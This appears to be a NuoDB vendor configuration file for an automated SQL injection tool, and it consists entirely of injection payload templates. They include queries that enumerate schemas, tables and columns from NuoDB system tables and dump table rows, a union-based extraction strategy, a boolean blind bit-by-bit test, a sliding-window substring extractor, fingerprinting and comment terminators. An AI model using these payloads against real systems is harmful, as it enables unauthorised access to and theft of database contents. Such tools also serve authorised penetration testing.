vendor: NuoDB
# jdbc:com.nuodb://127.0.0.1/test
# dba nuodb

resource:
 info: |
  select
      getreleaseversion()
      || '${enclose_value_sql}'
      || database()
      || '${enclose_value_sql}'
      || current_user()
      || '${trail_sql}'
      r
  from dual

 schema:
  database: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || t.s
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from (
           select distinct schema s
           from system.schemas
       ) t
       ${limit}
   ) a

  table: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || t.s
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from (
           select distinct tablename s
           from system.tables
           where schema = '${database}'
       ) t
       ${limit}
   ) a

  column: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || t.s
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from (
           select distinct field s
           from system.indexfields
           where schema = '${database}'
           and tablename = '${table}'
       ) t
       ${limit}
   ) a

  row:
   query: |
    select
        rr
        || '${trail_sql}'
        r
    from (
        select
            '${enclose_value_sql}'
            || s
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from (
            select distinct ${fields} s
            from ${database}.${table}
        ) t
        ${limit}
    ) a
   fields:
    field: ${field.value}
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substr(
           r,
           ${window.char},
           ${capacity}
       ) r
   from (${injection})x
  limit: limit ${limit.value}, 1
  failsafe: select '' || (1337${indice}7330%2b1) r from dual
  calibrator: replicate('${calibrator_sql}', 65536)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - nuodb

 normal:
  indices: union select ${result_range} from (${indice_unique})
  capacity: (select '${lead}${indice}' || ${calibrator} from dual)
  orderBy: order by 1337

 boolean:
  test:
   bit: |
    0 != (unicode(
        substr(
            (${injection}),
            ${window.char},
            1
        )
    )
    %26 ${bit})
   length: char_length((${injection})) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}